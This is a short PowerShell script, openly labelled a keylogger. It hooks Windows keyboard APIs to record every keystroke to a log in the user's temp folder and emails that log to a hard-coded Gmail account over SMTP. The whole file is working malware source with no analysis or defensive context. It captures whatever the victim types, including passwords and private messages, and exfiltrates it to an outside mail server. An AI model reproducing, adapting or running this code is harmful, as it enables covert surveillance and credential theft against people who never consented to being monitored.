# powershell keylogger
# created by: Reihtw

# gmail creds
$email = "example@gmail.com"
$password = "password"


# keylogger
function KeyLogger($logFile="$env:temp/$env:UserName.log")   {
    
    $logs = Get-Content "$logFile"
    $subject = "$env:UserName logs"
    $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
    $smtp.EnableSsl = $true
    $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
    $smtp.Send($email, $email, $subject, $logs);

    $generateLog = New-Item -Path $logFile -ItemType File -Force

     $APIsignatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $API = Add-Type -MemberDefinition $APIsignatures -Name "Win32" -Namespace Win32 -PassThru
    
    try {
        while ($true) {
            Start-Sleep -Milliseconds 40

            for ($ascii = 9; $ascii -le 254; $ascii++) {
                $keysate = $API::GetAsyncKeyState($ascii)
                if ($keysate -eq -32767) {
                    $null = [console]::CapsLock

                    $mapKey = $API::MapVirtualKey($ascii, 3)

                    $keyboardState = New-Object byte[] 256
                    $hideKeyboardState  = $API::GetKeyboardState($keyboardState)
                    $loggedchar = New-Object -TypeName System.Text.StringBuilder

                    if ($API::ToUnicode($ascii, $mapKey, $keyboardState, $loggedchar, $loggedchar.Capacity, 0)) {
                        [System.IO.File]::AppendAllText($logFile, $loggedchar.ToString())
                        # prints to console
                        Write-Host $loggedchar.ToString() -NoNewline
                    }
                }
            }
        }
    }
    finally {
        $smtp.Send($email, $email, $subject, $logs);
    }
}

KeyLogger